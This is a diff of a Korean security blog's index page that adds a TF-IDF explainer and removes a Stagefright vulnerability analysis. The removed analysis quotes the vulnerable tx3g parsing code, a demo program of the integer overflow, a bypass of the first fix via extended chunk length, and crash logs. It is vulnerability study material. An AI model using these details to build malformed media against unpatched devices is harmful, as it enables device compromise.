@@ -9,7 +9,7 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="CVE-2009-2692, sock_sendpage 에서 벌어지는 NULL pointer deref 버그를 정리한다. 발견자가 Tarvis Ormandy 인지 Brad Spengler 인지는 이런저런 문서를 읽어봐도 잘 모르겠다. Exploit 자체는 꽤 클래식해서 &hellip;">
+  <meta name="description" content="&ldquo;Multiplying TF and IDF therefore favours generally rare words that nevertheless occur often in our pages.&rdquo; TF-IDF 의 아이디어는 사실 단순하다. 웹페이지 &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -65,6 +65,159 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2016/01/15/tf-idf/">TF-IDF</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2016-01-15T15:10:14+09:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>15</span><span class='date-suffix'>th</span>, <span class='date-year'>2016</span></span> <span class='time'>3:10 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>&ldquo;Multiplying TF and IDF therefore favours generally rare words that nevertheless occur often in our pages.&rdquo;</p>
+
+<p>TF-IDF 의 아이디어는 사실 단순하다.</p>
+
+<ol>
+<li>웹페이지 하나를 분석한다고 치자. 분석 목적은 키워드 추출.</li>
+<li>가장 많이 등장하는 단어로 키워드를 추출한다면, &ldquo;the&rdquo; 나 &ldquo;a&rdquo; 같은 관사, 혹은 &ldquo;and&rdquo; 같은 전치사가 가장 많이 등장하지 않을까?</li>
+<li>절대적인 빈도가 아니라 상대적인 빈도가 더 맞을 것 같은데.</li>
+<li>&ldquo;the&rdquo; 의 경우 거의 모든 웹페이지에 등장할테니 상대적인 중요도는 떨어지지않을까?</li>
+<li>얼마나 많은 웹페이지에 등장하느냐를 측정하는 것이 IDF (Inverse Document Frequency)</li>
+<li>(특정 단어가 포함된 도큐먼트의 수/전체 도큐먼트 수)<sup>-1</sup></li>
+<li>Inverse 를 해주었기때문에 rare 한 단어의 경우 IDF 값이 커진다. (실상황에서는 log 값이 유의미하다고)</li>
+<li>하나의 문서에 등장하는 단어 빈도를 그대로 사용하지 말고 IDF 로 보정해주면, heuristic 하게 꽤 유의미한 키워드를 추출할 수 있다고 한다.</li>
+<li>TF (Term Frequency) * IDF (Inverse Document Frequency) = TF-IDF</li>
+</ol>
+
+
+<p>그렇다면, AdWords 같은 광고 스킴을 디자인한다고 가정하고. 광고주는 Nike 를 가정하자. 그리고 marathon, race, trophy 가 키워드인 웹페이지가 두 개있다고 가정하는데, 하나는 운동에 관한 페이지고 하나는 선거(election)에 관한 페이지다. 물론 Nike 는 운동에 관한 페이지에 자사 광고를 노출시키고 싶어한다. 맥락을 구별할 필요가 있는 것인데, 이런 경우 TF-IDF 를 이용할 수 있을까?</p>
+
+<p>이용할 수 있다. 두 개의 단어가 같이 출현하는 빈도를 생각해본다. 예를 들어, <code>marathon</code> 과 <code>42 kilometres</code> 또는 <code>26 miles</code> 는 실제 러닝을 다루는 웹페이지들에서 같이 출현했을 것이다. 또한 <code>election</code>, <code>voter</code>, <code>ballot</code> 은 선거를 다루는 글에서 같이 출현했을 것이다.</p>
+
+<p>다음의 계산을 거치면, 모든 pairs of words 에 대한 correlation 이 계산된다.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>for every page in all web pages on the Internet:
+</span><span class='line'>    for every pair of words in the page:
+</span><span class='line'>        correlation[word_A,word_B] += tf-idf(word_A) * tf-idf(word_B)</span></code></pre></td></tr></table></div></figure>
+
+
+<p></p>
+
+<p>즉 <code>marathon</code> 과 <code>42 kilometres</code> 의 인터넷 전체에서의 correlation 값이 나오는 것이다. 이런 무지막지한 계산을 하려니 Hadoop 과 MapReduce 같은 녀석들이 필요했었고, 또 만들었겠지.</p>
+
+<p>위처럼 word-word correlation 을 이용해 semantic 을 분석하는 기법이 Latent Semantic Analysis 의 기본 아이디어라고 한다. LSA-based algorithm 을 이용하여 Topic Analysis 를 할 수가 있는데, 그 예를 들어본다.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2016/01/13/android-hackers-handbook/">Android Hacker's Handbook</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2016-01-13T11:11:01+09:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2016</span></span> <span class='time'>11:11 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>유명한 아저씨들의 Android Hacker&rsquo;s Handbook 중에서 챕터 8 을 정리해본다.</p>
+
+<p>흠.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2016/01/11/cve-2013-2094-perf-swevent-enabled-revisited/">CVE-2013-2094: Perf_swevent_enabled Revisited</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2016-01-11T15:55:36+09:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>11</span><span class='date-suffix'>th</span>, <span class='date-year'>2016</span></span> <span class='time'>3:55 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>몇 달전에 increment primitive 를 만들어서 특정 byte 를 0 으로 만드는 기법으로 IDT 를 고쳐서, RING 0 수행을 만든 exploit 을 정리했었는데, 이번에는 Brad Spengler 의 exploit 을 분석해본다.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2016/01/11/bsides-vienna-2015-writing-your-first-windows-exploit-in-less-than-one-hour/">BSides Vienna 2015: Writing Your First Windows Exploit in Less Than One Hour</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2016-01-11T15:39:41+09:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>11</span><span class='date-suffix'>th</span>, <span class='date-year'>2016</span></span> <span class='time'>3:39 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>BSides Vienna 2015 에 발표된 <a href="https://github.com/maldevel/BSides_Vienna_2015/blob/master/exploit_workshop.pdf">Writing your first windows exploit in less than one hour</a> 를 정리해본다.</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -441,1287 +594,6 @@
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/09/13/sophail-applied-attacks-against-sophos-antivirus/">Sophail: Applied Attacks Against Sophos Antivirus</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-09-13T21:17:29+09:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:17 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Tavis Ormandy 의 <a href="https://lock.cmpxchg8b.com/sophailv2.pdf">Sophail: Applied attacks against Sophos Antivirus</a> 을 읽고 요약해본다.</p>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/09/13/stagefright/">Stagefright</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-09-13T20:55:51+09:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>8:55 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Android 의 Stagefright 버그를 정리해본다.</p>
-
-<ul>
-<li><a href="http://blog.fortinet.com/post/cryptogirl-on-stagefright-a-detailed-explanation">CryptoGirl on StageFright: A Detailed Explanation</a></li>
-<li><a href="http://translate.wooyun.io/2015/08/08/Stagefright-Vulnerability-Disclosure.html">Stagefright Vulnerability Disclosure</a></li>
-<li><a href="http://googleprojectzero.blogspot.gr/2015/09/stagefrightened.html">Stagefrightened?</a></li>
-<li><a href="https://blog.zimperium.com/the-latest-on-stagefright-cve-2015-1538-exploit-is-now-available-for-testing-purposes/">Zimperium Blog</a></li>
-</ul>
-
-
-<h4>What&rsquo;s an ATOM?</h4>
-
-<p>MPEG-4 는 atoms 나 boxes 같은 유닛으로 이뤄져있다. 이 box 들은 header 로 시작하는데, 헤더는 다음과 같다.
-BoxType 은 4 글자 코드로 구성된다. FourCC 라고 불리는데, <code>covr</code>, <code>esds</code> 같은 식이다.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>BOXHEADER structure
-</span><span class='line'>Field           Type                    Comment
-</span><span class='line'>TotalSize       UI32                    The total size of the box in bytes, including this header
-</span><span class='line'>BoxType         UI32                    The type of atom
-</span><span class='line'>ExtendedSize    If TotalSize equals 1   The total 64-bit length of the box in bytes,
-</span><span class='line'>                UI64                    including this header</span></code></pre></td></tr></table></div></figure>
-
-
-<p>MP4 를 분석할 때 유용한 도구들.</p>
-
-<ul>
-<li>010 Editor</li>
-<li>mp4file (apt-get install mp4v2-utils)</li>
-<li><a href="https://sites.google.com/site/james2013notes/download">mp4 parser</a></li>
-</ul>
-
-
-<p>StageFright 버그에 영향받는 Box 종류들은 다음과 같다.</p>
-
-<ul>
-<li><code>albm</code> : album title and track number for the media</li>
-<li><code>auth</code> : author of the media</li>
-<li><code>covr</code> : album cover artwork</li>
-<li><code>ctss</code> : composition Time To Sample mapping</li>
-<li><code>esds</code> : elementary Stream Description</li>
-<li><code>gnre</code> : genre of the media</li>
-<li><code>perf</code> : performer or artist</li>
-<li><code>stsc</code> : sample to chunk mapping</li>
-<li><code>stss</code> : list of sync samples</li>
-<li><code>tx3g</code> : text metadata</li>
-<li><code>yrrc</code> : recording year for the media</li>
-</ul>
-
-
-<p>여러가지 버그들이 있는데, 일단 대충 감을 잡기 위해 가장 간단한 <code>stts</code> integer overflow 를 보련다.</p>
-
-<h4>stts integer overflow</h4>
-
-<p>일단 패치만 보면,</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>-   uint64_t allocSize = numEntries * 2 * sizeof(uint32_t);
-</span><span class='line'>+   uint64_t allocSize = numEntries * 2 * (uint64_t)sizeof(uint32_t);</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li>주변의 소스를 봐야겠지만,</li>
-<li><code>(uint64_t)</code> 로 캐스팅을 안해줘서, 32 bit 로 연산이 되어서, overflow 가 나버리는 것 같다.</li>
-<li><code>allocSize = numEntries * 2 * 4 &gt;= 0xFFFFFFFF + 1</code> 이면 overflow 가 나서,</li>
-<li>작은 숫자가 되버리고, 그게 64 bit 로 확장되는 듯.</li>
-<li>작은 숫자로 memory alloc 이 되어서, 버퍼는 작은데, overrun 이 일어나는 듯.</li>
-</ul>
-
-
-<p><code>stts</code> box 는 <code>defines time-to-sample mapping for a sample table</code> 한다고 하는데.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>stts box
-</span><span class='line'>Field       Type                Comment
-</span><span class='line'>Header      BOXHEADER           BoxType = 'stts' (0x73747473)
-</span><span class='line'>Version     UI8                 Expected to be 0
-</span><span class='line'>Flags       UI24                None defined, set to 0
-</span><span class='line'>Count       UI32                The number of STTSRECORD entries
-</span><span class='line'>Entries     STTSRECORD[Count]   An array of STTSRECORD structures</span></code></pre></td></tr></table></div></figure>
-
-
-<p>여기서 numEntries 가 <code>Count</code> 에 해당한다고. <code>stts</code> 다음의 5,6,7,8 번째 바이트가 <code>20 00 00 00</code> 보다 크다면, integer overflow 가 난다고.</p>
-
-<p>Crash 를 보면,</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>F/libc: Fatal signal 11 (SIGSEGV) at 0x10958a14 (code=1), thread 1490 (Binder_2)...
-</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>Google Project Zero</h4>
-
-<p>구글 Project Zero 팀이 글을 하나 올렸는데. <code>tx3g</code> 청크 타입 파싱 루틴에서 발생하는 integer overflow 버그이다.</p>
-
-<p><code>chunk_size</code> 는 <code>uint64_t</code> 타입이며, 화일에서 읽어들인다. 공격자가 컨트롤하는 변수. 검증은 부족.</p>
-
-<ul>
-<li><code>size + chunk_size</code> 에서 overflow 가 발생하면서, 버퍼가 작게 alloc 되고</li>
-<li>바로 따라오는 memcpy 가 <code>size</code> 만큼 카피하면서 buffer overrun 이 발생하는 모양.</li>
-</ul>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>case FOURCC('t', 'x', '3', 'g'):
-</span><span class='line'>{
-</span><span class='line'>    uint32_t type;
-</span><span class='line'>    const void *data;
-</span><span class='line'>    size_t size = 0;
-</span><span class='line'>    if (!mLastTrack-&gt;meta-&gt;findData(kKeyTextFormatData, &type, &data, &size)) {
-</span><span class='line'>        size = 0;
-</span><span class='line'>    }
-</span><span class='line'>    uint8_t *buffer = new uint8_t[size + chunk_size];   // &lt;---- Integer overflow here
-</span><span class='line'>    if (size &gt; 0) {
-</span><span class='line'>        memcpy(buffer, data, size);                     // &lt;---- Oh dear.
-</span><span class='line'>    }
-</span><span class='line'>    if ((size_t)(mDataSource-&gt;readAt(*offset, buffer + size, chunk_size)) &lt; chunk_size) {
-</span><span class='line'>        delete[] buffer;
-</span><span class='line'>        buffer = NULL;
-</span><span class='line'>        return ERROR_IO;
-</span><span class='line'>    }
-</span><span class='line'>    mLastTrack-&gt;meta-&gt;setData(kKeyTextFormatData, 0, buffer, size + chunk_size);
-</span><span class='line'>    delete[] buffer;
-</span><span class='line'>    *offset += chunk_size;
-</span><span class='line'>    break;
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-
-<p>간단한 sample code 를 만들어보았다.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;cstddef&gt;
-</span><span class='line'>#include &lt;cstdio&gt;
-</span><span class='line'>#include &lt;cstring&gt;
-</span><span class='line'>#include &lt;cstdlib&gt;
-</span><span class='line'>#include &lt;iostream&gt;
-</span><span class='line'>
-</span><span class='line'>void* operator new(size_t size)
-</span><span class='line'>{
-</span><span class='line'>    std::cout &lt;&lt; "allocating " &lt;&lt; size &lt;&lt; std::endl;
-</span><span class='line'>    return malloc(size);
-</span><span class='line'>}
-</span><span class='line'>
-</span><span class='line'>int main()
-</span><span class='line'>{
-</span><span class='line'>    size_t size = 100;
-</span><span class='line'>    uint64_t chunk_size=0xffffffffffffffff;
-</span><span class='line'>    
-</span><span class='line'>    uint8_t *buffer = new uint8_t[size + chunk_size];
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-
-<p>이걸 컴파일해서 돌리면,</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ g++ babo.cpp
-</span><span class='line'>$ ./a.out
-</span><span class='line'>allocating 99
-</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li>new allocator 에서 <code>size + chunk_size</code> 를 계산할때, chunk_size 를 -1 로 계산하는 모양.</li>
-<li>메모리 alloc 되는 buf size 가 100 에서 99 로 줄어들었다.</li>
-<li>이런식으로 줄어든 버퍼에, <code>memcpy(...,...,100)</code> 이 들어가면 버퍼 오버런이 발생하게 된다.</li>
-</ul>
-
-
-<p>그래서, fix 가 들어갔는데, Mark Brand 에 따르면 완전하지 않다고.</p>
-
-<p>첫번째, Fix 는 다음과 같았는데.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>if (SIZE_MAX - chunk_size &lt;= size) {    // &lt;---- attempt to prevent overflow
-</span><span class='line'>    return ERROR_MALFORMED;
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-
-<p>문제는 chunk_size 는 <code>uint64_t</code> 인데, SIZE_MAX 는 <code>0xffffffff</code> 이라는 것. chunk_size > SIZE_MAX 일수가 있고, 그러면 if () check 를 통과하게 된다. Box 헤더의 extended chunk 를 쓰면 큰 chunk_size 를 만들 수 있다고 한다.</p>
-
-<p>아까 사용했던 코드에 overflow check 를 넣어서 테스트해본다.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;cstddef&gt;
-</span><span class='line'>#include &lt;cstdio&gt;
-</span><span class='line'>#include &lt;cstring&gt;
-</span><span class='line'>#include &lt;cstdlib&gt;
-</span><span class='line'>#include &lt;iostream&gt;
-</span><span class='line'>
-</span><span class='line'>void* operator new(size_t size)
-</span><span class='line'>{
-</span><span class='line'>    std::cout &lt;&lt; "allocating " &lt;&lt; size &lt;&lt; std::endl;
-</span><span class='line'>    return malloc(size);
-</span><span class='line'>}
-</span><span class='line'>
-</span><span class='line'>int main()
-</span><span class='line'>{
-</span><span class='line'>    size_t size = 100;
-</span><span class='line'>    uint64_t chunk_size=0xffffffffffffffff;
-</span><span class='line'>
-</span><span class='line'>#define MAX_SIZE (4294967295U)
-</span><span class='line'>
-</span><span class='line'>    if (MAX_SIZE - chunk_size &lt;= size) {
-</span><span class='line'>        std::cout &lt;&lt; "integer overflow detected!" &lt;&lt; std::endl;
-</span><span class='line'>    } else {
-</span><span class='line'>        std::cout &lt;&lt; "seems good." &lt;&lt; std::endl;
-</span><span class='line'>    }
-</span><span class='line'>    uint8_t *buffer = new uint8_t[size + chunk_size];
-</span><span class='line'>}
-</span><span class='line'>$ g++ babo.cpp
-</span><span class='line'>$ ./a.out
-</span><span class='line'>seems good.
-</span><span class='line'>allocating 99</span></code></pre></td></tr></table></div></figure>
-
-
-<p>체크를 바이패스하였다.</p>
-
-<p><a href="https://code.google.com/p/google-security-research/issues/detail?id=502">Issue 502: libstagefright integer overflow checks can by bypassed with extended chunk length</a></p>
-
-<p>Mark Brand 의 PoC subtitletest.mp4 를 HTC E8 에 넣고 돌리면 다음과 같이 mediaserver 가 죽는다.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>I/DEBUG   (  442): pid: 11709, tid: 11726, name: Binder_2  &gt;&gt;&gt; /system/bin/mediaserver &lt;&lt;&lt;
-</span><span class='line'>I/DEBUG   (  442): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0xdeadbaad
-</span><span class='line'>I/DEBUG   (  442): Abort message: 'invalid address or address of corrupt block 0xb760d3c0 passed to dlfree'
-</span><span class='line'>I/DEBUG   (  442):     r0 00000000  r1 b6f52dec  r2 00000001  r3 00000000
-</span><span class='line'>I/DEBUG   (  442):     r4 b760d3c0  r5 deadbaad  r6 00000048  r7 00000000
-</span><span class='line'>I/DEBUG   (  442):     r8 b760d3c8  r9 b47c5e98  sl b760d3c8  fp 00000000
-</span><span class='line'>I/DEBUG   (  442):     ip 00000000  sp b47c5e30  lr b6f23f5b  pc b6f23f5a  cpsr 60030030
-</span><span class='line'>I/DEBUG   (  442):
-</span><span class='line'>I/DEBUG   (  442): backtrace:
-</span><span class='line'>I/DEBUG   (  442):     #00 pc 00028f5a  /system/lib/libc.so (dlfree+1241)
-</span><span class='line'>I/DEBUG   (  442):     #01 pc 0000f1df  /system/lib/libc.so (free+10)
-</span><span class='line'>I/DEBUG   (  442):     #02 pc 000988c9  /system/lib/libstagefright.so (android::MPEG4Extractor::parseChunk(long long*, int)+1552)
-</span><span class='line'>I/DEBUG   (  442):     #03 pc 00098775  /system/lib/libstagefright.so (android::MPEG4Extractor::parseChunk(long long*, int)+1212)
-</span><span class='line'>I/DEBUG   (  442):     #04 pc 00098775  /system/lib/libstagefright.so (android::MPEG4Extractor::parseChunk(long long*, int)+1212)
-</span><span class='line'>I/DEBUG   (  442):     #05 pc 00098775  /system/lib/libstagefright.so (android::MPEG4Extractor::parseChunk(long long*, int)+1212)
-</span><span class='line'>I/DEBUG   (  442):     #06 pc 00098775  /system/lib/libstagefright.so (android::MPEG4Extractor::parseChunk(long long*, int)+1212)
-</span><span class='line'>I/DEBUG   (  442):     #07 pc 00098775  /system/lib/libstagefright.so (android::MPEG4Extractor::parseChunk(long long*, int)+1212)
-</span><span class='line'>I/DEBUG   (  442):     #08 pc 0009a29b  /system/lib/libstagefright.so (android::MPEG4Extractor::readMetaData()+66)
-</span><span class='line'>I/DEBUG   (  442):     #09 pc 0009a75b  /system/lib/libstagefright.so (android::MPEG4Extractor::countTracks()+4)
-</span><span class='line'>I/DEBUG   (  442):     #10 pc 0007df75  /system/lib/libstagefright.so (android::AwesomePlayer::setDataSource_l(android::sp&lt;android::MediaExtractor&gt; const&)+148)
-</span><span class='line'>I/DEBUG   (  442):     #11 pc 0007e915  /system/lib/libstagefright.so (android::AwesomePlayer::setDataSource_l(android::sp&lt;android::DataSource&gt; const&)+668)
-</span><span class='line'>I/DEBUG   (  442):     #12 pc 00080271  /system/lib/libstagefright.so (android::AwesomePlayer::setDataSource(int, long long, long long)+324)
-</span><span class='line'>I/DEBUG   (  442):     #13 pc 000450f9  /system/lib/libmediaplayerservice.so (android::MediaPlayerService::Client::setDataSource(int, long long, long long)+544)
-</span><span class='line'>I/DEBUG   (  442):     #14 pc 0005ca55  /system/lib/libmedia.so (android::BnMediaPlayer::onTransact(unsigned int, android::Parcel const&, android::Parcel*, unsigned int)+660)
-</span><span class='line'>I/DEBUG   (  442):     #15 pc 00017fc5  /system/lib/libbinder.so (android::BBinder::transact(unsigned int, android::Parcel const&, android::Parcel*, unsigned int)+60)
-</span><span class='line'>I/DEBUG   (  442):     #16 pc 0001d1d9  /system/lib/libbinder.so (android::IPCThreadState::executeCommand(int)+628)
-</span><span class='line'>I/DEBUG   (  442):     #17 pc 0001d347  /system/lib/libbinder.so (android::IPCThreadState::getAndExecuteCommand()+38)
-</span><span class='line'>I/DEBUG   (  442):     #18 pc 0001d39d  /system/lib/libbinder.so (android::IPCThreadState::joinThreadPool(bool)+68)
-</span><span class='line'>I/DEBUG   (  442):     #19 pc 00021a33  /system/lib/libbinder.so
-</span><span class='line'>I/DEBUG   (  442):     #20 pc 00011671  /system/lib/libutils.so (android::Thread::_threadLoop(void*)+112)
-</span><span class='line'>I/DEBUG   (  442):     #21 pc 00011131  /system/lib/libutils.so
-</span><span class='line'>I/DEBUG   (  442):     #22 pc 00012f8b  /system/lib/libc.so (__pthread_start(void*)+30)
-</span><span class='line'>I/DEBUG   (  442):     #23 pc 0001104f  /system/lib/libc.so (__start_thread+6)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>이제 PoC 분석에 들어가본다.</p>
-
-<p>아래 그림은 구글 블로그에서 가져온 것인데. text 를 두개 alloc 하는데, 하나는 정상, 그리고 또 하나는 extended chunk size 로 0xffffffffffffffff 을 세팅하는 mp3 데이터이다.</p>
-
-<p><img src="/images/tx3g.png"></p>
-
-<p>저자는 MPEGExtractor.cpp 쪽에 로그를 집어넣고 빌드를 다시해서, PoC MP4 를 로드해본 결과 다음과 같은 로그가 잡혔다고 한다.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'> MPEG4Extractor: Identified supported mpeg4 through LegacySniffMPEG4.
-</span><span class='line'> MPEG4Extractor: trak: new Track[20] (0xb6048160)
-</span><span class='line'> MPEG4Extractor: trak: mLastTrack = 0xb6048160
-</span><span class='line'> MPEG4Extractor: tx3g: size 0 chunk_size 24
-</span><span class='line'> MPEG4Extractor: tx3g: new[24] (0xb6048130)
-</span><span class='line'> MPEG4Extractor: tx3g: mDataSource-&gt;readAt(*offset, 0xb6048130, 24)
-</span><span class='line'> MPEG4Extractor: tx3g: size 24 chunk_size 18446744073709551615
-</span><span class='line'> MPEG4Extractor: tx3g: new[23] (0xb6048130)
-</span><span class='line'> MPEG4Extractor: tx3g: memcpy(0xb6048130, 0xb6048148, 24)
-</span><span class='line'> MPEG4Extractor: tx3g: mDataSource-&gt;readAt(*offset, 0xb6048148, 18446744073709551615)</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li><code>new[23] (0xb6048130)</code> 으로 24 - 1 이 잡혀버린 것.</li>
-<li><code>memcpy(0xb6048130, 0xb6048148, 24)</code> 로 24 가 들어간 것.</li>
-<li><code>mDataSource-&gt;readAt(*offset, 0xb6048148, 18446744073709551615)</code> 로 read 사이즈는 184467&hellip;1615 가 들어간 것.</li>
-</ul>
-
-
-<p>나도 CyanogenMod 를 빌드해서 올려놓고 테스트하는게 나을 것 같다는 생각이 든다.</p>
-
